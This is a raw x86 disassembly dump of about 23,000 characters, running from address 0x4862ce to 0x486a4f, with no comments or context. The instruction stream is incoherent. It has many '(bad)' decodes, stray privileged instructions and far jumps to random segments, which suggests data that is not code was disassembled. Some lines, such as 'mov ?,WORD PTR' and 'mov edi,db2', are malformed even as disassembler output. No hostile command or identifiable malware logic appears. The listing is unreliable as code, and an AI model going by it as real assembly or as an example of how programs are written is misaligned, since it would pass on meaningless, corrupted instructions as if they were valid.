  4862ce:	scas   eax,DWORD PTR es:[edi]
  4862cf:	xor    al,0xbf
  4862d1:	sahf   
  4862d2:	jnp    0x4862dc
  4862d4:	pop    esp
  4862d6:	or     ah,BYTE PTR [edi+0x2558bdbb]
  4862dc:	inc    edx
  4862dd:	pop    ss
  4862de:	sbb    bh,BYTE PTR [edi+0x35]
  4862e1:	adc    BYTE PTR [esi],dl
  4862e3:	dec    ebx
  4862e4:	mov    edx,DWORD PTR [edi+0x43]
  4862e7:	xor    BYTE PTR [eax],cl
  4862e9:	test   ch,bl
  4862eb:	pop    ebx
  4862ec:	mov    edi,0x4c76c36b
  4862f1:	push   edi
  4862f2:	aaa    
  4862f3:	pop    ss
  4862f4:	pop    ds
  4862f5:	inc    ebx
  4862f6:	pop    ss
  4862f7:	test   eax,0xae06c725
  4862fc:	pop    ss
  4862fd:	xor    al,0xda
  4862ff:	jo     0x4862db
  486301:	sub    BYTE PTR [ebx-0x7e38bcfe],bh
  486307:	cmp    al,0x15
  486309:	ins    BYTE PTR es:[edi],dx
  48630a:	pop    edi
  48630b:	mov    bh,0x39
  48630d:	add    BYTE PTR [eax],bh
  48630f:	or     esi,DWORD PTR [eax+0x33bf8408]
  486315:	xchg   ebp,eax
  486316:	cmp    al,0x3d
  486318:	adc    esp,DWORD PTR [ebx]
  48631a:	inc    esi
  48631b:	xor    ebx,esp
  48631d:	mov    ebp,0x443b893b
  486322:	and    esi,DWORD PTR [edi]
  486324:	and    eax,0xe70ec507
  486329:	out    0x30,eax
  48632b:	mov    ch,0xe4
  48632d:	xchg   edx,eax
  48632e:	sub    BYTE PTR [esi+0x60ad3030],0x1b
  486335:	pop    ss
  486336:	pop    edi
  486337:	pop    ds
  486338:	iret   
  486339:	imul   eax,DWORD PTR [ebx+0x31],0xffffffa4
  48633d:	pop    ss
  48633e:	das    
  48633f:	cmp    BYTE PTR [edi],ch
  486341:	fnsave [ecx+0x31]
  486344:	nop
  486345:	inc    ebx
  486346:	imul   edi,DWORD PTR [edi+0x33],0xffffffb8
  48634a:	mov    BYTE PTR [esp+ecx*4+0x2f],dl
  48634e:	pop    ss
  48634f:	das    
  486350:	outs   dx,BYTE PTR ds:[esi]
  486351:	imul   eax,DWORD PTR [ecx],0x34
  486354:	mov    bh,0x77
  486356:	inc    ebp
  486357:	rol    BYTE PTR [ebx],1
  486359:	faddp  st(7),st
  48635b:	jecxz  0x48637c
  48635d:	(bad)  
  48635e:	(bad)  [ecx-0x28b0bcf3]
  486364:	out    dx,eax
  486365:	sub    BYTE PTR [esi],ah
  486367:	mov    cs,WORD PTR [ebx]
  486369:	rcl    DWORD PTR [edi],cl
  48636b:	inc    esi
  48636c:	dec    edi
  48636d:	lds    esp,FWORD PTR [edx-0x28]
  486370:	xor    BYTE PTR [edi],bl
  486372:	(bad)  
  486374:	xor    DWORD PTR [ebp+0x7b],ecx
  486377:	pop    edx
  486378:	sub    esi,DWORD PTR [edi-0x72f498cc]
  48637e:	(bad)  
  48637f:	push   0x56fabf32
  486384:	or     ecx,DWORD PTR [ebp+esi*4+0x14e3f67]
  48638b:	sub    al,0xb9
  48638d:	or     BYTE PTR [edi-0x2593e7ce],bh
  486393:	mov    bh,BYTE PTR [edi-0x41]
  486396:	cmp    edi,esi
  486398:	sbb    bl,bl
  48639a:	or     ah,BYTE PTR [esi+0x3f]
  48639d:	xor    ebp,DWORD PTR [edi+0x17045ddf]
  4863a3:	jl     0x4863c8
  4863a5:	sysexit 
  4863a7:	jg     0x4863ea
  4863a9:	pop    edx
  4863aa:	xor    al,BYTE PTR [ebp-0x55]
  4863ad:	xchg   DWORD PTR [edi+0x34],ebp
  4863b0:	retf   
  4863b1:	xor    al,0xad
  4863b3:	inc    eax
  4863b4:	scas   eax,DWORD PTR es:[edi]
  4863b5:	outs   dx,DWORD PTR ds:[esi]
  4863b6:	xor    esi,DWORD PTR [esi-0x40ea7362]
  4863bc:	mov    edi,0x2b070006
  4863c1:	nop    edi
  4863c4:	scas   al,BYTE PTR es:[edi]
  4863c5:	add    eax,0xdffbc657
  4863ca:	dec    edi
  4863cb:	jmp    0x33d664ea
  4863d0:	out    0xbf,eax
  4863d2:	ret    0x5d2e
  4863d5:	sbb    DWORD PTR [ebx],edx
  4863d7:	push   ebx
  4863d8:	add    eax,0xdf4458d7
  4863dd:	pop    ds
  4863de:	outs   dx,DWORD PTR ds:[esi]
  4863df:	adc    eax,0x320d760b
  4863e4:	push   ebx
  4863e5:	outs   dx,DWORD PTR ds:[esi]
  4863e6:	mov    edi,0x84460ab0
  4863eb:	adc    edi,DWORD PTR [edi]
  4863ed:	pop    es
  4863ee:	mov    WORD PTR [esi+0x624f0a05],gs
  4863f4:	mov    ah,0xa6
  4863f6:	ja     0x486469
  4863f8:	xchg   edx,eax
  4863f9:	xor    ecx,DWORD PTR [edi-0x3eb9df79]
  4863ff:	inc    eax
  486400:	daa    
  486401:	inc    esp
  486402:	out    0x15,eax
  486404:	loopne 0x48645e
  486406:	mov    edx,0xd53f17e7
  48640b:	rcl    BYTE PTR [esi],0x4d
  48640e:	xor    dl,bh
  486410:	aas    
  486411:	inc    ebx
  486412:	arpl   WORD PTR [edx+0x57],si
  486415:	imul   ebp,DWORD PTR [esi-0x75],0xffffffb7
  486419:	(bad)  
  48641b:	sub    al,0x6
  48641d:	adc    al,0xeb
  48641f:	aas    
  486420:	outs   dx,DWORD PTR ds:[esi]
  486421:	jmp    0x32ff:0x101c8560
  486428:	push   0x8780608b
  48642d:	cmp    edi,edi
  48642f:	ja     0x486431
  486431:	pop    edi
  486432:	mov    ds:0x6c7b746,eax
  486437:	pop    ebx
  486438:	aad    0x88
  48643a:	out    0x9f,eax
  48643c:	inc    edi
  48643d:	shl    DWORD PTR [ebp-0x40896a72],1
  486443:	push   edi
  486444:	ret    0x468a
  486447:	test   DWORD PTR [edi],edx
  486449:	fwait
  48644a:	xor    DWORD PTR [eax-0x5b],edx
  48644d:	mov    ah,BYTE PTR [edi-0x73cccac9]
  486453:	sbb    ebx,eax
  486455:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  486456:	pop    ds
  486457:	lahf   
  486458:	xor    eax,DWORD PTR [esi-0xc7a27d]
  48645e:	ja     0x48643b
  486460:	jge    0x4864c2
  486462:	push   esp
  486463:	fisttp QWORD PTR [edx]
  486465:	addr16 lahf 
  486467:	sbb    bl,BYTE PTR [ecx]
  486469:	sbb    dl,al
  48646b:	mov    eax,DWORD PTR [ebp-0x49]
  48646e:	inc    ebx
  48646f:	cmp    DWORD PTR [edx+0x430095d8],esp
  486475:	xchg   DWORD PTR [edi],edx
  486477:	ss popa 
  486479:	xor    eax,0x2faf30e0
  48647e:	add    eax,0xbf035a2b
  486483:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  486484:	dec    edi
  486485:	mov    ch,0xd
  486487:	or     esi,DWORD PTR [esi]
  486489:	xor    al,0x7f
  48648b:	packuswb mm0,mm0
  48648e:	xchg   ecx,eax
  48648f:	mov    BYTE PTR [ebp-0x1af0cc49],0xa
  486496:	mov    ds:0x4e31ae57,eax
  48649b:	(bad)  
  48649c:	es jl  0x4864e8
  48649f:	shl    edi,cl
  4864a1:	ja     0x486441
  4864a3:	inc    ebx
  4864a4:	call   0x2ed3:0xeb573474
  4864ab:	lods   al,BYTE PTR ds:[esi]
  4864ac:	xor    cl,bh
  4864ae:	inc    edi
  4864af:	xor    bl,BYTE PTR ss:[edi-0x55]
  4864b3:	ret    0xb1b1
  4864b6:	cmp    ecx,edi
  4864b8:	adc    DWORD PTR [esi],0xcf30ae0c
  4864be:	jg     0x486487
  4864c0:	mov    ch,0xe0
  4864c2:	call   0x90ea:0xe4cf4b4a
  4864c9:	sub    BYTE PTR [edi-0x1e],bl
  4864cc:	mov    dh,0x36
  4864ce:	mov    ah,BYTE PTR [ebx]
  4864d0:	pushf  
  4864d1:	shl    edi,0x4a
  4864d4:	push   edi
  4864d5:	not    DWORD PTR [edx+0x31e154ca]
  4864db:	lahf   
  4864dc:	xor    DWORD PTR [ecx+0x41],eax
  4864df:	dec    edx
  4864e0:	sahf   
  4864e1:	adc    BYTE PTR [esi+0x5adc0730],ch
  4864e7:	ins    DWORD PTR es:[edi],dx
  4864e8:	ins    BYTE PTR es:[edi],dx
  4864e9:	daa    
  4864ea:	xchg   edi,eax
  4864eb:	das    
  4864ec:	dec    eax
  4864ed:	or     eax,0xf38c7e4
  4864f2:	xor    al,0x62
  4864f4:	call   0xb413bdc3
  4864f9:	jmp    ecx
  4864fb:	push   esi
  4864fc:	mov    DWORD PTR [eax+0x20e9b32],edi
  486502:	push   ss
  486503:	pop    esp
  486504:	ja     0x4864fd
  486506:	xor    eax,0x28520ff
  48650b:	arpl   WORD PTR [edi-0x49],sp
  48650e:	pop    edi
  48650f:	push   es
  486510:	outs   dx,DWORD PTR ds:[esi]
  486511:	push   edx
  486512:	sahf   
  486513:	xor    al,0xf3
  486515:	imul   eax,DWORD PTR [ebx+0x13],0x54
  486519:	js     0x48657a
  48651b:	ror    DWORD PTR [edi-0x59],cl
  48651e:	xor    DWORD PTR [eax-0x65],edi
  486521:	ds es out dx,eax
  486524:	xlat   BYTE PTR ds:[ebx]
  486525:	mov    bh,0x82
  486527:	jae    0x48655a
  486529:	in     eax,dx
  48652a:	(bad)  
  48652b:	out    dx,eax
  48652c:	inc    ecx
  48652d:	pop    es
  48652e:	adc    esi,DWORD PTR [ecx+0x1bc7911a]
  486534:	xchg   edi,eax
  486535:	mov    cl,0x21
  486537:	ror    edi,1
  486539:	aaa    
  48653a:	xlat   BYTE PTR ds:[ebx]
  48653b:	icebp  
  48653c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48653d:	add    eax,0xfb363d2
  486542:	push   ss
  486543:	bound  eax,QWORD PTR [ebp+0x3463279b]
  486549:	xchg   BYTE PTR [esi+edx*1],bl
  48654c:	dec    esp
  48654d:	outs   dx,DWORD PTR ds:[esi]
  48654e:	addr16 pop edx
  486550:	xchg   ebp,eax
  486551:	clc    
  486552:	clc    
  486553:	cmp    edi,DWORD PTR [edi-0x1c168269]
  486559:	xchg   edx,eax
  48655a:	sysret 
  48655c:	sbb    esi,DWORD PTR ds:0x2f15bc15
  486562:	mov    ebx,0x2a54297
  486567:	or     dl,bh
  486569:	xchg   DWORD PTR ds:0x350a400f,esi
  48656f:	jo     0x4865a8
  486571:	xor    eax,DWORD PTR [edi+0x9]
  486574:	(bad)  
  486575:	or     eax,0xaba77fed
  48657a:	mov    eax,0x5719e92f
  48657f:	(bad)  
  486582:	jnp    0x4865af
  486584:	jns    0x48656c
  486586:	xor    eax,0x6b6f53ff
  48658b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48658c:	or     ebx,DWORD PTR [eax-0x79]
  48658f:	imul   edi,DWORD PTR [edx-0x3a],0xffffffb9
  486593:	mov    ah,0x27
  486595:	jecxz  0x486541
  486597:	fld    TBYTE PTR [edx+0x36]
  48659a:	mov    edx,0x3f312f6e
  48659f:	repz cmp BYTE PTR [ebx],cl
  4865a2:	jl     0x4865be
  4865a4:	xor    DWORD PTR [edi-0x1df1a09d],0xffffffd6
  4865ab:	mov    WORD PTR [edi-0x78bfac1e],ss
  4865b1:	mov    eax,0x6e6f1bc0
  4865b6:	mov    DWORD PTR [ecx],0xb7c7afb4
  4865bc:	xchg   edx,eax
  4865bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4865be:	push   es
  4865bf:	jl     0x4865b8
  4865c1:	push   edi
  4865c2:	adc    bh,bh
  4865c4:	xor    al,0x17
  4865c6:	push   ecx
  4865c7:	pop    eax
  4865c8:	mov    al,0xa
  4865ca:	push   edi
  4865cb:	push   edi
  4865cc:	fadd   st(1),st
  4865ce:	adc    DWORD PTR [esi],edx
  4865d0:	retf   
  4865d1:	fist   WORD PTR [edi+0x76]
  4865d4:	in     eax,dx
  4865d5:	ss sbb al,0x3c
  4865d8:	xchg   ebx,eax
  4865d9:	dec    edi
  4865da:	addr16 cs pop ss
  4865dd:	jmp    0xafeb:0x6660d278
  4865e4:	xor    al,al
  4865e6:	nop
  4865e7:	out    0x32,eax
  4865e9:	xor    esp,esi
  4865eb:	lea    ecx,[ebp-0x8]
  4865ee:	sbb    BYTE PTR [edi],0xef
  4865f1:	fld    TBYTE PTR [ebp-0x70]
  4865f4:	mov    eax,0x38377a27
  4865f9:	out    dx,eax
  4865fa:	data16 (bad) 
  4865fc:	pop    ebp
  4865fd:	pop    ss
  4865fe:	pop    ds
  4865ff:	daa    
  486600:	inc    esp
  486601:	pop    ds
  486602:	inc    ebp
  486603:	out    dx,eax
  486604:	jno    0x4865b6
  486606:	inc    ebp
  486607:	inc    edi
  486608:	mov    bl,0x1a
  48660a:	dec    ebx
  48660b:	or     bl,BYTE PTR [esi]
  48660d:	add    DWORD PTR [edi+ecx*2-0x3d],ebp
  486611:	dec    edi
  486612:	stos   DWORD PTR es:[edi],eax
  486613:	shr    BYTE PTR [ebp+0x462f44e9],0x6f
  48661a:	cmp    cl,BYTE PTR [edx+0x35971289]
  486620:	dec    edi
  486621:	inc    esp
  486622:	ret    0x2b42
  486625:	add    eax,0x4aabe77f
  48662a:	add    ebp,DWORD PTR [esi]
  48662c:	das    
  48662d:	xor    bh,bh
  48662f:	iret   
  486630:	(bad)  
  486631:	push   0x33df1898
  486636:	xlat   BYTE PTR ds:[ebx]
  486637:	stos   DWORD PTR es:[edi],eax
  486638:	pop    edx
  486639:	(bad)  
  48663a:	jmp    0xa311:0xb837c7b7
  486641:	add    dl,bh
  486643:	arpl   WORD PTR [ebx],si
  486645:	cmp    BYTE PTR [edx],cl
  486647:	ss in  al,dx
  486649:	iret   
  48664a:	call   DWORD PTR [edi+0x34]
  48664d:	imul   edx,DWORD PTR ds:0x2f272b1e,0x5584f11f
  486657:	js     0x48663b
  486659:	push   edi
  48665a:	jg     0x4866b3
  48665c:	and    al,dh
  48665e:	stos   BYTE PTR es:[edi],al
  48665f:	pop    edi
  486660:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  486661:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  486662:	or     ch,BYTE PTR [esi+0x4]
  486665:	pop    eax
  486666:	(bad)  
  486667:	jle    0x486698
  486669:	stos   DWORD PTR es:[edi],eax
  48666a:	mov    ch,0xb7
  48666c:	ss xchg edi,esp
  48666f:	pop    es
  486670:	sbb    esp,DWORD PTR [esi]
  486672:	or     BYTE PTR [edi],ch
  486674:	mov    dh,0xcf
  486676:	scas   eax,DWORD PTR es:[edi]
  486677:	xor    ebx,edx
  486679:	outs   dx,BYTE PTR ds:[esi]
  48667a:	sub    al,0x28
  48667c:	xchg   ecx,eax
  48667d:	inc    edi
  48667e:	mov    edi,0xb0b2e364
  486683:	mov    ds:0x13c5687f,eax
  486688:	push   ss
  486689:	nop    ebx
  48668c:	xchg   edi,eax
  48668d:	push   edx
  48668e:	and    dl,dl
  486690:	outs   dx,DWORD PTR ss:[esi]
  486692:	inc    edx
  486693:	xor    ecx,DWORD PTR [edi+0x132df5c5]
  486699:	xor    eax,DWORD PTR [edi+0x4d6aab37]
  48669f:	cmp    cl,BYTE PTR [esi+0xf9e7fdf]
  4866a5:	das    
  4866a6:	add    eax,0x461f2707
  4866ab:	inc    ebp
  4866ac:	jo     0x4866f8
  4866ae:	test   BYTE PTR [ebx+0x44],cl
  4866b1:	das    
  4866b2:	cs popa 
  4866b4:	add    ecx,DWORD PTR [ecx+edx*2-0x2514fcf1]
  4866bb:	mov    al,ds:0x3fc767b7
  4866c0:	xchg   edi,eax
  4866c1:	nop
  4866c2:	or     bl,ch
  4866c4:	js     0x486715
  4866c6:	push   edi
  4866c7:	jnp    0x486703
  4866c9:	push   cs
  4866ca:	push   esi
  4866cb:	cmc    
  4866cc:	sbb    esi,DWORD PTR [edi]
  4866ce:	push   edi
  4866cf:	xchg   DWORD PTR [ebx+0x7b12a35],edx
  4866d5:	fimul  DWORD PTR [di-0x42]
  4866d9:	ins    DWORD PTR es:[edi],dx
  4866da:	pop    edi
  4866db:	iret   
  4866dc:	inc    ebp
  4866dd:	ret    0x8457
  4866e0:	(bad)  
  4866e1:	push   0x37
  4866e3:	adc    BYTE PTR [edi-0x6e],0x28
  4866e7:	push   ds
  4866e8:	adc    BYTE PTR [edx],ch
  4866ea:	iret   
  4866eb:	scas   eax,DWORD PTR es:[edi]
  4866ec:	push   edi
  4866ed:	stos   DWORD PTR es:[edi],eax
  4866ee:	or     BYTE PTR [eax+ebx*4],ch
  4866f1:	xor    esi,DWORD PTR [edi+0x27]
  4866f4:	ins    BYTE PTR es:[edi],dx
  4866f5:	and    DWORD PTR [ebx],edx
  4866f7:	or     al,0x17
  4866f9:	inc    ebx
  4866fa:	xlat   BYTE PTR ds:[ebx]
  4866fb:	jne    0x4866dd
  4866fd:	mov    al,0x4c
  4866ff:	inc    esi
  486700:	call   0xc769:0xeb05687
  486707:	fistp  QWORD PTR [ecx+0x6f176a07]
  48670d:	pop    ss
  48670e:	jg     0x486715
  486710:	pop    ss
  486711:	mov    dh,BYTE PTR [edi+esi*4-0x3be81161]
  486718:	mov    esi,0xc38f1b56
  48671d:	(bad)  
  48671e:	pop    ebx
  48671f:	and    esi,DWORD PTR [eax+ebx*8]
  486722:	xor    eax,0xd8df773f
  486727:	inc    ecx
  486728:	enter  0x3810,0x34
  48672c:	(bad)
  486730:	mov    ?,WORD PTR [edi+edx*4]
  486733:	or     BYTE PTR [esi-0x20c024a0],ch
  486739:	outs   dx,DWORD PTR ss:[esi]
  48673b:	je     0x4866e9
  48673d:	inc    eax
  48673e:	mov    es,WORD PTR [ebx+0x1f]
  486741:	mov    esi,0x2faa6db6
  486746:	cmp    DWORD PTR [edi+0x3],eax
  486749:	jecxz  0x4867b7
  48674b:	mov    eax,ds:0xa7778760
  486750:	pop    edi
  486751:	fadd   DWORD PTR [esi-0x3b]
  486754:	(bad)  
  486755:	fist   WORD PTR [edi+0x3f]
  486758:	inc    ebx
  486759:	call   0x78402c66
  48675e:	mov    edi,db2
  486761:	sti    
  486762:	dec    edx
  486763:	lahf   
  486764:	push   DWORD PTR [edx]
  486766:	sub    al,0x39
  486768:	fsub   DWORD PTR [edx+0x68413f17]
  48676e:	adc    eax,0x9f176e2c
  486773:	lods   eax,DWORD PTR ds:[esi]
  486774:	pop    ebx
  486775:	stos   DWORD PTR es:[edi],eax
  486776:	loopne 0x4867ab
  486778:	lahf   
  486779:	aaa    
  48677a:	daa    
  48677b:	inc    esi
  48677c:	test   DWORD PTR [esi+0x6f],edx
  48677f:	xchg   edi,eax
  486780:	lahf   
  486781:	inc    edi
  486782:	pop    esp
  486783:	mov    BYTE PTR [ecx],dl
  486785:	out    dx,eax
  486786:	cmp    DWORD PTR [edi-0x5b55acd7],edx
  48678c:	retf   
  48678d:	stos   DWORD PTR es:[edi],eax
  48678e:	add    eax,0x5ec0e94e
  486793:	out    dx,eax
  486794:	retf   
  486795:	daa    
  486796:	pusha  
  486797:	sbb    eax,0x454f60ba
  48679c:	fisttp WORD PTR ds:0xd7b80d08
  4867a2:	xor    eax,0x4796c747
  4867a7:	jmp    0x48676f
  4867a9:	inc    ebp
  4867aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4867ab:	push   edi
  4867ac:	xor    ch,BYTE PTR [esi]
  4867ae:	push   0x1d
  4867b0:	push   es
  4867b1:	outs   dx,DWORD PTR ds:[esi]
  4867b2:	pop    es
  4867b3:	pop    esp
  4867b4:	popa   
  4867b5:	pop    ebx
  4867b6:	xlat   BYTE PTR ds:[ebx]
  4867b7:	xlat   BYTE PTR ds:[ebx]
  4867b8:	push   edi
  4867b9:	xor    edx,DWORD PTR [edx+0x9]
  4867bc:	bound  edx,QWORD PTR [eax+0x2f]
  4867bf:	dec    esi
  4867c0:	inc    esi
  4867c1:	pop    edi
  4867c2:	cmp    BYTE PTR [ecx],bh
  4867c4:	pop    eax
  4867c5:	xchg   esi,eax
  4867c6:	ss inc esi
  4867c8:	jg     0x486761
  4867ca:	arpl   WORD PTR [edi],sp
  4867cc:	dec    edi
  4867cd:	xor    BYTE PTR es:[eax],bh
  4867d0:	lahf   
  4867d1:	xor    eax,0x2eb4a533
  4867d6:	add    DWORD PTR [edi+0x789d2893],edi
  4867dc:	(bad)  
  4867dd:	sbb    esi,DWORD PTR [edi-0x20]
  4867e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4867e1:	mov    ch,0xed
  4867e3:	add    esp,DWORD PTR [edi]
  4867e5:	ja     0x486856
  4867e7:	inc    ecx
  4867e8:	jbe    0x4867d7
  4867ea:	mov    edx,0x343f0776
  4867ef:	daa    
  4867f0:	xor    eax,0x71836ee7
  4867f5:	cs inc ebx
  4867f7:	dec    ebx
  4867f8:	dec    esi
  4867f9:	pusha  
  4867fa:	adc    al,0x4c
  4867fc:	and    eax,0xda3730db
  486801:	sub    ch,BYTE PTR [esi]
  486803:	jbe    0x486870
  486805:	daa    
  486806:	outs   dx,DWORD PTR ds:[esi]
  486807:	lahf   
  486808:	shr    BYTE PTR [edx],1
  48680a:	add    al,0xb0
  48680c:	pop    edi
  48680d:	and    DWORD PTR [ebp+0x137fa851],0xdbd62245
  486817:	icebp  
  486818:	pop    edi
  486819:	pop    edi
  48681a:	mov    ds:0xad558a37,eax
  48681f:	in     eax,dx
  486820:	xor    ch,BYTE PTR [edi]
  486822:	xchg   edi,eax
  486823:	mov    ebx,0xd7c76a62
  486829:	dec    edi
  48682a:	iret   
  48682b:	sbb    al,0x6b
  48682d:	sbb    eax,0x94efc7d2
  486832:	push   es
  486833:	lods   eax,DWORD PTR ds:[esi]
  486834:	or     bl,BYTE PTR [edi+0x2f]
  486837:	test   DWORD PTR ds:0xaf8ba561,esi
  48683d:	jmp    0x48680f
  48683f:	jbe    0x486886
  486841:	das    
  486842:	inc    ebx
  486843:	arpl   di,bp
  486845:	rcl    BYTE PTR [esi-0x3834a783],0xf
  48684c:	clc    
  48684d:	xchg   BYTE PTR [edx+0x1c],al
  486850:	push   edi
  486851:	push   ebx
  486852:	mov    ecx,0x3fe69712
  486857:	xor    DWORD PTR [edi-0x69],esp
  48685a:	and    DWORD PTR [ebx],edx
  48685c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48685d:	inc    esi
  48685e:	ficomp DWORD PTR [edi+0x34]
  486861:	(bad)
  486864:	das    
  486865:	(bad)  
  486866:	ja     0x48689d
  486868:	pop    ss
  486869:	dec    edx
  48686a:	popa   
  48686b:	add    eax,0x3e835342
  486870:	mov    cl,0x3c
  486872:	les    ebp,FWORD PTR [ebx+0x42]
  486875:	(bad)  
  486876:	mov    ecx,DWORD PTR [ecx]
  486878:	(bad)  
  486879:	clc    
  48687a:	or     esi,DWORD PTR [ecx]
  48687c:	xchg   edi,eax
  48687d:	mov    edi,0x13a4ac2e
  486882:	pop    esi
  486883:	xor    BYTE PTR [edi],al
  486885:	xor    BYTE PTR [edx-0x70e52fe2],bh
  48688b:	mov    esp,ecx
  48688d:	(bad)  
  48688e:	cmc    
  48688f:	xchg   ebx,eax
  486890:	aas    
  486891:	pop    edx
  486892:	out    0x16,eax
  486894:	add    BYTE PTR [edi-0x2095d8e6],dh
  48689a:	mov    DWORD PTR [edi-0x58],esi
  48689d:	fist   DWORD PTR [edi]
  48689f:	(bad)  
  4868a0:	xchg   edi,ebx
  4868a2:	inc    edx
  4868a3:	imul   edx,DWORD PTR [ecx],0x6f319f5c
  4868a9:	and    ecx,DWORD PTR [edi+esi*1-0x45083bc8]
  4868b0:	ret    
  4868b1:	call   0x3e4b:0x17580bee
  4868b8:	das    
  4868b9:	pop    esp
  4868ba:	or     DWORD PTR [ebx+0x4ae397d0],ebp
  4868c0:	aad    0x9a
  4868c2:	dec    ebp
  4868c3:	inc    ebx
  4868c4:	scas   eax,DWORD PTR es:[edi]
  4868c5:	xchg   ebp,eax
  4868c6:	hlt    
  4868c7:	pop    edx
  4868c8:	aam    0x7f
  4868ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4868cb:	inc    ebp
  4868cc:	(bad)  
  4868cd:	data16 fsub QWORD PTR [ebp+0x6f0f361f]
  4868d4:	or     eax,0x97058956
  4868d9:	xchg   esi,eax
  4868da:	inc    ebp
  4868db:	xchg   BYTE PTR es:[edx+0x6f],cl
  4868df:	xor    eax,0x354a7a77
  4868e4:	cs cli 
  4868e6:	mov    edi,0x3425694f
  4868eb:	bound  eax,QWORD PTR [edi-0xd]
  4868ee:	add    eax,0x47e04e29
  4868f3:	aas    
  4868f4:	jg     0x486897
  4868f6:	not    esi
  4868f8:	mov    al,ds:0xe4df4fcf
  4868fd:	imul   eax,DWORD PTR [ebp-0x31bcdc8c],0x42
  486904:	xchg   BYTE PTR [ebx+0x390f0349],cl
  48690a:	pop    edi
  48690b:	(bad)  
  48690c:	lods   eax,DWORD PTR ds:[esi]
  48690d:	dec    edi
  48690e:	sub    al,0x5b
  486910:	pop    ss
  486911:	or     esp,eax
  486913:	inc    ecx
  486914:	stos   BYTE PTR es:[edi],al
  486915:	(bad)  
  486916:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  486917:	ja     0x4868a6
  486919:	pop    ebp
  48691a:	mov    DWORD PTR [edi],esp
  48691c:	ja     0x4868b1
  48691e:	retf   
  48691f:	mov    BYTE PTR [esi+0x357fac8b],ch
  486925:	das    
  486926:	test   BYTE PTR [edx],ch
  486928:	pusha  
  486929:	ret    
  48692a:	fcmovnb st,st(7)
  48692c:	push   ebp
  48692d:	xor    eax,0x2fbf569a
  486932:	xchg   edi,eax
  486933:	in     eax,dx
  486934:	fdiv   DWORD PTR [eax]
  486936:	mov    ah,BYTE PTR [edi-0x5d]
  486939:	fisttp WORD PTR ds:0x3fad355a
  48693f:	jmp    FWORD PTR [edi]
  486941:	push   edx
  486942:	lahf   
  486943:	(bad)  
  486944:	mov    gs,WORD PTR [edi]
  486946:	out    dx,eax
  486947:	ret    0x41ad
  48694a:	mov    DWORD PTR [edi-0x31],ebp
  48694d:	xor    bl,BYTE PTR [eax]
  48694f:	(bad)  
  486951:	push   0x2f
  486953:	aas    
  486954:	or     esi,DWORD PTR [eax+ecx*2-0x106c7857]
  48695b:	test   eax,0x17050297
  486960:	xchg   edx,eax
  486961:	dec    edx
  486962:	cmp    BYTE PTR [edx+0x51],ch
  486965:	(bad)  
  486967:	scas   al,BYTE PTR es:[edi]
  486968:	mov    esi,0x7717b074
  48696d:	dec    ebx
  48696e:	pop    ds
  48696f:	sub    DWORD PTR [esi],eax
  486971:	fcom   QWORD PTR [ecx+0xa27d607]
  486977:	adc    al,0xac
  486979:	pop    eax
  48697a:	lahf   
  48697b:	pop    ss
  48697c:	test   DWORD PTR [eax+eiz*2-0x18],edx
  486980:	aas    
  486981:	xor    eax,0xe00f57
  486986:	fmul   DWORD PTR [edi-0x15]
  486989:	das    
  48698a:	adc    eax,0x31c85222
  48698f:	pop    ebx
  486990:	pusha  
  486991:	cmp    BYTE PTR [edx-0x4b],ch
  486994:	aas    
  486995:	ficomp WORD PTR [edi+0x4a]
  486998:	mov    bh,0x93
  48699a:	out    0x34,eax
  48699c:	ss inc ebx
  48699e:	jg     0x4869e2
  4869a0:	leave  
  4869a1:	mov    bh,0xe0
  4869a3:	sbb    eax,0x5f0787e7
  4869a8:	xor    DWORD PTR [eax+0x6fa455a2],ebx
  4869ae:	lahf   
  4869af:	xor    DWORD PTR [edx],edx
  4869b1:	sbb    esi,DWORD PTR [eax]
  4869b3:	jmp    0x8e12:0x5583fff
  4869ba:	aaa    
  4869bb:	xor    eax,0xd3581af
  4869c0:	lea    ecx,[edi+0x7b42d736]
  4869c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4869c7:	push   ds
  4869c8:	jg     0x486955
  4869ca:	das    
  4869cb:	jae    0x4869aa
  4869cd:	cmp    cl,BYTE PTR [ebp+0x38c74477]
  4869d3:	mov    eax,ds:0xdf045a85
  4869d8:	xchg   DWORD PTR [esi-0x8a73ba5],ecx
  4869de:	fild   WORD PTR [esi-0x522b4775]
  4869e4:	shl    DWORD PTR [edx],1
  4869e6:	aaa    
  4869e7:	pop    ebx
  4869e8:	push   0x1763b88f
  4869ed:	xor    bh,0x87
  4869f0:	imul   eax,DWORD PTR [eax+0x30],0xf3253c5
  4869f7:	push   ebp
  4869f8:	lock inc edx
  4869fa:	pop    ebx
  4869fb:	imul   BYTE PTR [edi]
  4869fd:	out    0x6f,eax
  4869ff:	mov    ch,0x89
  486a01:	dec    ecx
  486a02:	or     edi,0x30
  486a05:	out    0x20,eax
  486a07:	mov    cl,0x51
  486a09:	inc    edi
  486a0a:	inc    esi
  486a0b:	mov    bh,0xad
  486a0d:	jmp    0x102b97fa
  486a12:	not    DWORD PTR [edi-0x45]
  486a15:	push   eax
  486a16:	in     al,0x62
  486a18:	mov    bh,0x31
  486a1a:	and    edx,DWORD PTR [edi]
  486a1c:	mov    ds:0x2f5a2c27,eax
  486a21:	mov    DWORD PTR [esi],0x5aa64952
  486a27:	aas    
  486a28:	xor    eax,0xad5d3572
  486a2d:	getsec 
  486a2f:	mov    edi,0x2688c130
  486a34:	pop    eax
  486a35:	aaa    
  486a36:	aaa    
  486a37:	not    DWORD PTR [edi-0x57]
  486a3a:	adc    BYTE PTR [esi-0x58c8989f],cl
  486a40:	xchg   edx,eax
  486a41:	and    esp,esp
  486a43:	pop    edx
  486a44:	xchg   esi,eax
  486a45:	xor    edi,DWORD PTR [ecx]
  486a47:	mov    gs,WORD PTR [ebp-0x58e8bab8]
  486a4d:	xchg   DWORD PTR [eax],edi
  486a4f:	sbb    al,0x10
